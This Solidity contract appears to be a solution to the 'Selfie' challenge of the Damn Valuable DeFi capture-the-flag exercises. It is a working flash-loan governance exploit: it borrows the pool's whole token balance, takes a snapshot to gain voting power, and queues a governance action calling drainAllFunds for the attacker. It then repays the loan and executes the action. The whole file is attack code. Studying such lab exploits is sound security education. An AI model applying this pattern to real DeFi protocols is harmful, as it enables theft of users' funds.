// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;
import "../selfie/SelfiePool.sol";
import "../selfie/SimpleGovernance.sol";
import "../DamnValuableTokenSnapshot.sol";

contract SelfieAttack {
  SelfiePool public pool;
  SimpleGovernance public governance;
  DamnValuableTokenSnapshot public token;
  address attacker;
  uint256 actionID;

  constructor(
    address _pool,
    address _governance,
    address tokenAddress,
    address _attacker
  ) {
    pool = SelfiePool(_pool);
    governance = SimpleGovernance(_governance);
    token = DamnValuableTokenSnapshot(tokenAddress);
    attacker = _attacker;
  }

  function attack() public {
    pool.flashLoan(token.balanceOf(address(pool)));
  }

  function receiveTokens(address addy, uint256 amt) external {
    token.snapshot();
    actionID = governance.queueAction(
      address(pool),
      abi.encodeWithSignature("drainAllFunds(address)", attacker),
      0
    );
    token.transfer(address(pool), token.balanceOf(address(this)));
  }

  function execute() public {
    governance.executeAction(actionID);
  }
}
